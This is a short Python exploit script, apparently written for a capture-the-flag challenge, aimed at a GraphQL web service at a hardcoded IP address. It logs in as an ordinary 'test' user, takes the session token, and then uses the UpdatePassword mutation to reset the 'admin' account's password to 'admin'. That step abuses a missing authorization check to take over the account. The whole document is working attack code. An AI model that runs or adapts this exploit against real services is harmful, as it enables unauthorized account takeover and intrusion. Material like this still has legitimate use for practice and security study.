import requests
import json

URL = "http://167.172.50.208:32288"

HEADERS = {"Content-Type": "application/json"}


def login(session, username, password):
    url = "%s/graphql" % URL
    payload = '{"query":"mutation($username: String!, $password: String!)'
    payload += ' { LoginUser(username: $username, password: $password) { message, token } }","variables":'
    payload += '{"username":"%s","password":"%s"}}' % (
        username, password)
    r = session.post(url, data=payload, headers=HEADERS)
    return r.text


def add_phrase(session):
    url = "%s/graphql" % URL
    payload = '{"query":"mutation($recType: String!, $recAddr: String!, $recUser: String!, $recPass: String!, $recNote: String!) { AddPhrase(recType: $recType, recAddr: $recAddr, recUser: $recUser, recPass: $recPass, recNote: $recNote) { message } }","variables":{"recType":"Web","recAddr":"a","recUser":"a","recPass":"a","recNote":"a"}}'
    r = session.post(url, data=payload, headers=HEADERS)
    return r.text


def update_password(session, username, password):
    url = "%s/graphql" % URL
    payload = '{"query":"mutation($username: String!, $password: String!)'
    payload += ' { UpdatePassword(username: $username, password: $password) { message, token } }","variables":'
    payload += '{"username":"%s","password":"%s"}}' % (
        username, password)
    r = session.post(url, data=payload, headers=HEADERS)
    return r.text


session = requests.Session()
username = "test"
password = "test"

# Login
res = login(session, username, password)
assert "User logged in successfully!" in res

# Read token
token = json.loads(res)["data"]["LoginUser"]["token"]
assert token != ""

# Set token in session
session.cookies.set('session', token)

# Try an auth call
res = add_phrase(session)
assert "Phrase added successfully!" in res

# Change admin password
res = update_password(session, "admin", "admin")
assert "Password updated successfully!" in res
